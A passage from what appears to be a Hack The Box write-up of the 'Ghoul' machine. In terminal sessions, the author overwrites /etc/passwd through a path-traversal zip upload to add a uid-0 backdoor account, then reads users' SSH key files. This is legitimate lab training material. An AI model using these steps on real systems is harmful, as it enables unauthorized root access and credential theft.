class="line">-r-xr-xr-x 1 root root   8977 Dec 13  2018 contact.html</span><br><span class="line">dr-xr-xr-x 1 root root   4096 Dec 13  2018 css</span><br><span class="line">-r-xr-xr-x 1 root root  37906 Dec 13  2018 eto.jpg</span><br><span class="line">dr-xr-xr-x 1 root root   4096 Dec 13  2018 images</span><br><span class="line">-r-xr-xr-x 1 root root  11000 Dec 13  2018 index.html</span><br><span class="line">dr-xr-xr-x 1 root root   4096 Dec 13  2018 js</span><br><span class="line">-r-xr-xr-x 1 root root  13721 Dec 13  2018 kaneki-ken.jpg</span><br><span class="line">-rw-r--r-- 1 root root    239 Dec 13  2018 kaneki.html</span><br><span class="line">-r-xr-xr-x 1 root root 112642 Dec 13  2018 kaneki.jpg</span><br><span class="line">-r-xr-xr-x 1 root root    134 Dec 13  2018 kaneki.php</span><br><span class="line">-r-xr-xr-x 1 root root  13721 Dec 13  2018 ken.jpg</span><br><span class="line">dr-xr-xr-x 1 root root   4096 Dec 13  2018 less</span><br><span class="line">-r-xr-xr-x 1 root root  18457 Dec 13  2018 noro.jpg</span><br><span class="line">-r-xr-xr-x 1 root root   4865 Dec 13  2018 secret.php</span><br><span class="line">-rw-r--r-- 1 root root    328 Oct  4 11:17 shell.php</span><br><span class="line">-r-xr-xr-x 1 root root  18159 Dec 13  2018 tatara.jpg</span><br><span class="line">dr-xr-xr-x 1 root root   4096 Dec 13  2018 uploads</span><br><span class="line">dr-xr-xr-x 1 root root   4096 Dec 13  2018 users</span><br><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$</span><br></pre></td></tr></table></figure>
<p>So I tried to use the <code>zip</code> exploit again to overwrite <code>/etc/passwd</code>, but first I had to create the <code>passwd</code> file. I copied the one from the box :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;bin&#x2F;sh</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:104:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">kaneki:x:1000:1000::&#x2F;home&#x2F;kaneki:&#x2F;bin&#x2F;bash</span><br><span class="line">Eto:x:1001:1001::&#x2F;home&#x2F;Eto:&#x2F;bin&#x2F;bash</span><br><span class="line">noro:x:1002:1002::&#x2F;home&#x2F;noro:&#x2F;bin&#x2F;bash</span><br><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$</span><br></pre></td></tr></table></figure>
<p>I used <code>openssl</code> to generate the hash of the password (<code>AAAA</code>) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# openssl passwd AAAA</span><br><span class="line">gDlPrjU6SWeKo</span><br></pre></td></tr></table></figure>
<p>Then I added a new user called <code>rooot</code> with the the <code>uid</code> 0  to the <code>passwd</code> file :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# echo &quot;rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt; passwd</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# cat passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;bin&#x2F;sh</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:104:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">kaneki:x:1000:1000::&#x2F;home&#x2F;kaneki:&#x2F;bin&#x2F;bash</span><br><span class="line">Eto:x:1001:1001::&#x2F;home&#x2F;Eto:&#x2F;bin&#x2F;bash</span><br><span class="line">noro:x:1002:1002::&#x2F;home&#x2F;noro:&#x2F;bin&#x2F;bash</span><br><span class="line">rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul#</span><br></pre></td></tr></table></figure>
<p>After that I created the <code>zip</code> file like I did before :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# cd &#x2F;etc&#x2F;</span><br><span class="line">root@kali:&#x2F;etc# mv passwd passwd.1</span><br><span class="line">root@kali:&#x2F;etc# cp ~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul&#x2F;passwd .</span><br><span class="line">root@kali:&#x2F;etc# cd -</span><br><span class="line">&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# zip passwd.zip ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">  adding: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd (deflated 62%)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# rm &#x2F;etc&#x2F;passwd</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# mv &#x2F;etc&#x2F;passwd.1 &#x2F;etc&#x2F;passwd</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul#</span><br></pre></td></tr></table></figure>
<p>Then I uploaded it :<br><img src="/images/hackthebox/ghoul/16.png" alt=""><br>Now we can do <code>su rooot</code> and use <code>AAAA</code> as a password :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;bin&#x2F;sh</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:104:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">kaneki:x:1000:1000::&#x2F;home&#x2F;kaneki:&#x2F;bin&#x2F;bash</span><br><span class="line">Eto:x:1001:1001::&#x2F;home&#x2F;Eto:&#x2F;bin&#x2F;bash</span><br><span class="line">noro:x:1002:1002::&#x2F;home&#x2F;noro:&#x2F;bin&#x2F;bash</span><br><span class="line">rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">www-data@Aogiri:&#x2F;var&#x2F;www&#x2F;html$ su rooot</span><br><span class="line">Password: </span><br><span class="line">root@Aogiri:&#x2F;var&#x2F;www&#x2F;html# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@Aogiri:&#x2F;var&#x2F;www&#x2F;html#</span><br></pre></td></tr></table></figure>
<p>And I could get the user flag from <code>/home/kaneki</code> :<br><img src="/images/hackthebox/ghoul/17.png" alt=""><br>We owned user.</p>
<h2 id="Enumeration-Pivoting-from-Aogiri-to-kaneki-pc"><a href="#Enumeration-Pivoting-from-Aogiri-to-kaneki-pc" class="headerlink" title="Enumeration, Pivoting from Aogiri to kaneki-pc"></a>Enumeration, Pivoting from Aogiri to kaneki-pc</h2><p>After getting root I couldn’t find the root flag :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki# cd &#x2F;root&#x2F;</span><br><span class="line">root@Aogiri:~# ls -la</span><br><span class="line">total 48</span><br><span class="line">drwx------ 1 root root  4096 Apr 28 14:17 .</span><br><span class="line">drwxr-xr-x 1 root root  4096 Dec 13  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root root     9 Dec 29  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 root root  3106 Dec 13  2018 .bashrc</span><br><span class="line">drwx------ 1 root root  4096 Dec 13  2018 .cache</span><br><span class="line">-rw-r--r-- 1 root root   148 Dec 13  2018 .profile</span><br><span class="line">-rw-r--r-- 1 root root     0 Jan 22  2019 .selected_editor</span><br><span class="line">drw------- 1 root root  4096 Dec 13  2018 .ssh</span><br><span class="line">-rw------- 1 root root 12094 Apr 28 14:17 .viminfo</span><br><span class="line">root@Aogiri:~#</span><br></pre></td></tr></table></figure>
<p>So I started to enumerate the home directories, web and configuration files.<br>Every user had some notes (hints) in their home directory :<br><code>Eto</code> : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;home&#x2F;Eto# ls -al</span><br><span class="line">total 40</span><br><span class="line">drwx------ 1 Eto  Eto  4096 Dec 13  2018 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Dec 13  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Dec 29  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rwx------ 1 Eto  Eto   220 Dec 13  2018 .bash_logout</span><br><span class="line">-rwx------ 1 Eto  Eto  3771 Dec 13  2018 .bashrc</span><br><span class="line">-rwx------ 1 Eto  Eto   807 Dec 13  2018 .profile</span><br><span class="line">drwx------ 1 Eto  Eto  4096 Dec 13  2018 .ssh</span><br><span class="line">-rwx------ 1 Eto  Eto    92 Dec 13  2018 alert.txt</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;Eto# cat alert.txt </span><br><span class="line">Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;Eto#</span><br></pre></td></tr></table></figure>
<p><code>kaneki</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki# ls -al</span><br><span class="line">total 92</span><br><span class="line">drwx------ 1 kaneki kaneki  4096 Dec 13  2018 .</span><br><span class="line">drwxr-xr-x 1 root   root    4096 Dec 13  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root   root       9 Dec 29  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rwx------ 1 kaneki kaneki   220 Dec 13  2018 .bash_logout</span><br><span class="line">-rwx------ 1 kaneki kaneki  3771 Dec 13  2018 .bashrc</span><br><span class="line">-rwx------ 1 kaneki kaneki   807 Dec 13  2018 .profile</span><br><span class="line">drwx------ 1 kaneki kaneki  4096 Dec 13  2018 .ssh</span><br><span class="line">-rw------- 1 kaneki kaneki  1802 Dec 13  2018 .viminfo</span><br><span class="line">-rw------- 1 kaneki kaneki   148 Dec 13  2018 note.txt</span><br><span class="line">-rwx------ 1 kaneki kaneki   136 Dec 13  2018 notes</span><br><span class="line">-rwx------ 1 kaneki kaneki 39382 Dec 13  2018 secret.jpg</span><br><span class="line">-rwx------ 1 kaneki kaneki    33 Dec 13  2018 user.txt</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki# cat note.txt </span><br><span class="line">Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki# cat notes</span><br><span class="line">I&#39;ve set up file server into the server&#39;s network ,Eto if you need to transfer files to the server can use my pc.</span><br><span class="line">DM me for the access.</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki#</span><br></pre></td></tr></table></figure>
<p><code>noro</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;home# cd noro&#x2F;</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;noro# ls -al</span><br><span class="line">total 40</span><br><span class="line">drwx------ 1 noro noro 4096 Dec 13  2018 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Dec 13  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Dec 29  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rwx------ 1 noro noro  220 Dec 13  2018 .bash_logout</span><br><span class="line">-rwx------ 1 noro noro 3771 Dec 13  2018 .bashrc</span><br><span class="line">-rwx------ 1 noro noro  807 Dec 13  2018 .profile</span><br><span class="line">drwx------ 1 noro noro 4096 Dec 13  2018 .ssh</span><br><span class="line">-rwx------ 1 noro noro   24 Dec 13  2018 to-do.txt</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;noro# cat to-do.txt </span><br><span class="line">Need to update backups.</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;noro#</span><br></pre></td></tr></table></figure>
<p>I could also get <code>ssh</code> info for the 3 users :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;home&#x2F;Eto&#x2F;.ssh# ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 1 Eto Eto 4096 Dec 13  2018 .</span><br><span class="line">drwx------ 1 Eto Eto 4096 Dec 13  2018 ..</span><br><span class="line">-rwx------ 1 Eto Eto  392 Dec 13  2018 authorized_keys</span><br><span class="line">-rwx------ 1 Eto Eto 1675 Dec 13  2018 id_rsa</span><br><span class="line">-rwx------ 1 Eto Eto  392 Dec 13  2018 id_rsa.pub</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;Eto&#x2F;.ssh# cat authorized_keys</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzKoGE8Z9QDJDlC52zJFtQHHvZGxXgLi8fnYCOCi6GvuDV+ZNt3krFCwbkn02HAExvj1J9GXkPbZGNwMlYOYNZPqVOT7RRJML9yQNKxl4FW2IX4R23DPN17i&#x2F;vjF4Gyjkk05H+P4QXsk34KZ71SOT+KMGTJ2tpV+VUKAl6jlMJM5ahDAPgrA6k2DOLk+oRF4c7Riwc2xz3&#x2F;PNI&#x2F;EJR8MMK5tP8bp6NUPt2AtCLO495dBFeGX6I164G5csjxxJKx5mzgjJsv5BL0l4H0RvLobDoXF++Lm3r580R6dVFsSlkC7TLJ8oscreVs6cfanQwc0E7zs61dipl5q9ceW1XWK&#x2F;J Eto@Aogiri                              </span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;Eto&#x2F;.ssh# cd ..&#x2F;..&#x2F;kaneki&#x2F;.ssh&#x2F;</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki&#x2F;.ssh# ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 1 kaneki kaneki 4096 Dec 13  2018 .</span><br><span class="line">drwx------ 1 kaneki kaneki 4096 Dec 13  2018 ..</span><br><span class="line">-rwx------ 1 kaneki kaneki  797 Dec 13  2018 authorized_keys</span><br><span class="line">-rwx------ 1 kaneki kaneki 1766 Dec 13  2018 id_rsa</span><br><span class="line">-rwx------ 1 kaneki kaneki  395 Dec 13  2018 id_rsa.pub</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki&#x2F;.ssh# cat authorized_keys</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ&#x2F;02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru&#x2F;ESc9AVIQIaeTypLNT&#x2F;FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI&#x2F;SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl kaneki_pub@kaneki-pc                    </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS&#x2F;nnKN&#x2F;LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M&#x2F;gCYm4fD9FppbOdG4xMVGODbTTPV&#x2F;h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0&#x2F;RNmLC&#x2F;rhwoUC+Wh0KPkuErg4YlqD8IB7L3N&#x2F;UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri                           </span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki&#x2F;.ssh# cd 